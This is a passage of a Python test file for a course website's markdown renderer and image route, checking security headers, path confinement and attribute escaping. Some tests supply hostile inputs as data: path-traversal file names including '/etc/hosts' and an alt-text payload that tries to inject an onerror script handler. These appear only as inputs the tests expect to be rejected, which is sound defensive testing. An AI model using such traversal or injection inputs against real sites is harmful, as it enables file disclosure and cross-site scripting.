        assert C.unit_image_path(c["slug"], _WK1, "escape.svg") is None
    finally:
        os.unlink(link)


def test_the_renderer_and_the_route_agree_by_construction(client):
    """A URL the renderer emits must be one the route serves, and the bytes must
    come back as an image with a policy of its own."""
    ctx = _img_ctx()
    out = C.render("![d](img/trust-boundaries.svg)", ctx=ctx)
    url = re.search(r'<img src="([^"]+)"', out).group(1)
    r = client.get(url)
    assert r.status_code == 200, (url, r.status_code)
    assert r.headers["Content-Type"] == "image/svg+xml"
    # An SVG reached by navigation, not by <img>, is the case where script in it
    # would run. The response refuses on its own.
    assert "default-src 'none'" in r.headers["Content-Security-Policy"]
    assert r.headers["X-Content-Type-Options"] == "nosniff"
    assert r.data.startswith(b"<svg"), r.data[:40]


def test_the_image_route_refuses_anything_outside_img(client):
    c = C.list_courses()[0]
    for bad in (f"/learn/{c['slug']}/{_WK1}/img/worksheet.md",
                f"/learn/{c['slug']}/{_WK1}/img/..%2f..%2fworksheet.md",
                f"/learn/{c['slug']}/no-such-week/img/trust-boundaries.svg",
                f"/learn/not-a-course/{_WK1}/img/trust-boundaries.svg"):
        assert client.get(bad).status_code in (301, 308, 404), bad


def test_alt_text_cannot_break_out_of_the_attribute():
    out = C.render('![a" onerror="alert(1)](img/trust-boundaries.svg)', ctx=_img_ctx())
    assert 'onerror="alert(1)"' not in out, out
    assert "&quot;" in out, out


def test_emphasis_does_not_reach_inside_an_alt_attribute():
    """The tag is stashed for the same reason code spans are: `_ITALIC` would
    otherwise pair asterisks across an attribute and open an <em> inside it."""
    out = C.render("![a *b* c](img/trust-boundaries.svg)", ctx=_img_ctx())
    assert "<em>" not in out, out


def test_an_image_written_inside_a_code_span_stays_literal():
    out = C.render("`![x](img/trust-boundaries.svg)`", ctx=_img_ctx())
    assert "<img" not in out, out
    assert "<code>" in out, out


def test_the_filename_pattern_is_what_stops_a_relative_name():
    """Without it, `../img/<real file>` resolves: the extension is fine and
    realpath lands back inside img/, so every other check waves it through.
    Flask's <name> converter will not match a slash, so this is not reachable
    over HTTP today - it is reachable the moment anything else calls the
    resolver, which is exactly when a redundant-looking guard earns its place."""
    c = C.list_courses()[0]
    for name in ("../img/trust-boundaries.svg", "img/trust-boundaries.svg",
                 "./trust-boundaries.svg", "..", "/etc/hosts",
                 "TRUST-BOUNDARIES.SVG", ".hidden.svg"):
        assert C.unit_image_path(c["slug"], _WK1, name) is None, name


def test_an_unpublished_unit_serves_no_images():
    """A directory that ships no public document is not part of the course, and
    its img/ must not become a back door into it."""
    c = C.list_courses()[0]
    unit = "week98-not-published"
    d = os.path.join(c["root"], unit, "img")
    os.makedirs(d, exist_ok=True)
    f = os.path.join(d, "x.svg")
    with open(f, "w", encoding="utf-8") as fh:
        fh.write("<svg xmlns='http://www.w3.org/2000/svg'/>")
    try:
        assert os.path.isfile(f)
        assert not C.primary_kind(unit, c["slug"]), "fixture is not unpublished"
        assert C.unit_image_path(c["slug"], unit, "x.svg") is None
    finally:
        shutil.rmtree(os.path.join(c["root"], unit), ignore_errors=True)
